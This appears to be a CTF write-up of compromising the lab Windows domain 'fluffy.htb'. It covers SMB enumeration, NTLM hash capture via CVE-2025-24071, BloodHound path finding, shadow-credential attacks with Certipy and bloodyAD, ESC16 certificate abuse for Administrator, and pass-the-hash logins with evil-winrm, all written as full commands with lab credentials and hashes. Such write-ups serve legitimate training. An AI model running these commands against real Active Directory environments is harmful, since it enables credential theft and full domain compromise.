# Enumeration

> To start off with we are given the following known credentials: `j.fleischman:J0elTHEM4n1990!`. It seems we can't directly winrm with these creds, so like always we can check them against LDAP and SMB.

![asdf](https://i.imgur.com/bghV28D.png)



> Now that we have a valid SMB/LDAP login, we can start enumerating shares and users.

![asdf](https://i.imgur.com/Jpr9wFC.png)

![asdfasdf](https://i.imgur.com/jHcH7BF.png)



> Seeing the read/write perms for the `IT` share, we should enumerate it and see what's inside. When we do we find some interesting files:

![asdfasdfasdf](https://i.imgur.com/T8YVeA3.png)



> We see two zip files along with their extracted contents along with a file called `Upgrade_Notice.pdf` We open this file in a PDF viewer and see that it's a report detailing vulnerabilities in the system, specifically containing CVE numbers and their associated severity.

![recentvulns](https://i.imgur.com/lWKB1IH.png)



> Looking into the most critical CVEs, one in particular caught my eye. `CVE-2025-24071`

# Foothold

## CVE-2025-24071

> According to [vicarius.io](https://www.vicarius.io/vsociety/posts/cve-2025-24071-spoofing-vulnerability-in-microsoft-windows-file-explorer-detection-scrip): 
>
> "*CVE-2025-24071 is a vulnerability in Microsoft Windows File Explorer that could allow attackers to capture NTLM credentials via crafted network shares, leading to credential theft and broader compromise opportunities.*"
>
> Upon further research I found a [proof of concept](https://github.com/0x6rss/CVE-2025-24071_PoC) that details an implementation of this vulnerability where, if a `.library-ms` file is extracted from a .rar archive, Windows Explorer automatically initiates an SMB authentication request. This can lead to NTLM hash disclosure, and is the exploit we are going to attempt first since we found some .zip files in the share.
>
> 

![make the zip](https://i.imgur.com/AajXCNh.png)

## Domain Enumeration

> After we extract and crack the hash for user `p.agila`, we want to again test these credentials against winrm, SMB, and LDAP to see if we have any new permissions with the new user. Unfortunately it seems we still cannot winrm into the system, and the SMB perms seem to still be the same. Struggling to find any way other way in with the `p.agila`, I thought to try collecting data to feed into bloodhound and see what comes back.



```bash
bloodhound-python --username=p.agila --password=prometheusx-303 --domain=fluffy.htb -ns 10.129.232.88 --collectionmethod=All
```



> The above command collects all domain information on the `fluffy.htb` domain and its structure. Plugging it into bloodhound we can see a path from `p.agila` to the `winrm` account through the following permission chain:

![pathtowinrm](https://i.imgur.com/aNiwB0c.png)



> Since the `winrm_svc` user has permissions to remote into the machine it might get us into the system. We also see that we `p.agila` is a member of the `Service Account Managers` group, which has the `GenericAll` permission on `Service Accounts`, which has `GenericWrite` to the `winrm_svc` account. The bloodhound tips show that we can generate shadow credentials that will allow us to steal the NTLM hash of `winrm_svc` and login with it.



## Shadow Credentials w/ Certipy

> The following command will add `p.agila` to the `Service Accounts` group, giving us `GenericWrite` over `winrm_svc`. This sets us up for a shadow credentials attack which should result in us receiving the accounts' NTLM hash.

```bash
bloodyAD --host 10.129.232.88 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
```



> Next we use `certipy-ad`'s one shot command to take our `p.agila` credentials and obtain the hash.

```bash
certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account winrm_svc
```



> This command will first check if the `winrm_svc` user exists and that `p.agila` has the necessary permissions on `winrm_svc` (GenericWrite, GenericAll) to perform the attack. It will then generate a new RSA key pair (private/public key) to create a self-signed certificate formatted for Active Directory. The `winrm_svc` account's `msDS-KeyCredentialLink` attribute will then be modified to contain the public key we generated before. This allows for the bypassing of password authentication by allowing certificate authentication instead. Public Key Cryptography for Initial Authentication (PKINIT) is then used to take that generated public key (the certificate) to requests a Ticket Granting Ticket (TGT) for the `winrm_svc` account. Then with some method that I don't fully understand the NTLM hash for the target account can be decrypted with our generated public key (the certificate) being a main part of it.

```bash
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
```

![get da hash for winrm_svc](https://i.imgur.com/0c3A45u.png)



## user.txt

> We can then use this hash to authenticate and get a shell through `evil-winrm`.

```bash
evil-winrm -i 10.129.232.88 -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
```

![got user flag](https://i.imgur.com/LPmOS86.png)



# Privilege Escalation

> After enumerating the machine a bit more, I felt that I should be looking at more domain abuse options since that's what yielded the initial access. Taking another look at the bloodhound graphs, there are other accounts that we might be able to access through the same method, namely `ca_svc` and `ldap_svc`.

## More Shadow Credentials

> We will start by again adding our user `p.agila` to the `Service Accounts` group since the box resets the groups frequently. Then we will run the same command as before to automatically create shadow credentials but for the `ca_svc` account.

```bash
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheux-303' -account ca_svc
```

![more add group](https://i.imgur.com/HRtCQz3.png)



> With the NT hash for `ca_svc` we should be able to now authenticate to the system as this user. If we get more details about the account we can see that it is the Active Directory Certificate Service account for the system.

```bash
certipy-ad account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.192.252 -user 'ca_svc' read
```

![da ca account](https://i.imgur.com/IxuzwHP.png)



## Template Enumeration

> Normally these kinds of easy Windows boxes involves vulnerable templates, and since we have access to `ca_svc` it's probably a good idea to see what templates there are.

```bash
certipy-ad find -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.192.252 -vulnerable -stdout
```

![what templates are there](https://i.imgur.com/ssJRQwU.png)



## Escalation Path 16 (ESC16)

> While no vulnerable certificate templates are shown, according to the above command output the certificate authority `fluffy-DC01-CA` may be vulnerable to `ESC16`. According to [the wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally):

![ESC16 wiki](https://i.imgur.com/3PzxLI5.png)



> We own four accounts at this point: `j.fleischman`, `p.agila`, `winrm_svc`, and `ca_svc`. The above approach is pretty straightforward. Further down [in the wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) it even outlines the commands needed to exploit this vulnerability. We need to identify the UPN of the high-value target account, in this case it will just be `administrator`. 

```bash
certipy-ad account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.230.105 -user 'administrator' read
```

![read the admin account](https://i.imgur.com/TxoVL0a.png)



> Next we will change the UPN for `ca_svc` to be `administrator`

```bash
certipy-ad account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.230.105 -upn 'administrator' -user 'ca_svc' update
```

![change ca_svc upn to admin](https://i.imgur.com/cLml1tW.png)



> Then we request the certificate for `ca_svc`. Since we changed the UPN to be `administrator`, and because of `ESC16`, when we request this certificate, it will be for the Administrator account. It will save a .pfx file to be used later.

```bash
certipy-ad req -dc-ip 10.129.230.105 -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```

![administrator.pfx](https://i.imgur.com/LiwvaH9.png)



> We then have to change back `ca_svc`'s UPN to "ca_svc" from "administrator".

```bash
certipy-ad account -dc-ip 10.129.230.105 -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

![change back UPN](https://i.imgur.com/HzpAVTw.png)



> Lastly, we authenticate to the domain with saved `administration.pfx` to end up with the Administrator accounts hash.

```bash
certipy-ad auth -dc-ip 10.129.230.105 -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb'
```

![admin hash](https://i.imgur.com/IrKtnFb.png)



## root.txt

> Finally, we use can pass the administrator's hash via `evil-winrm` to get the root flag:

```bash
evil-winrm -i 10.129.230.105 -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
```

![root](https://i.imgur.com/aMvbCMS.png)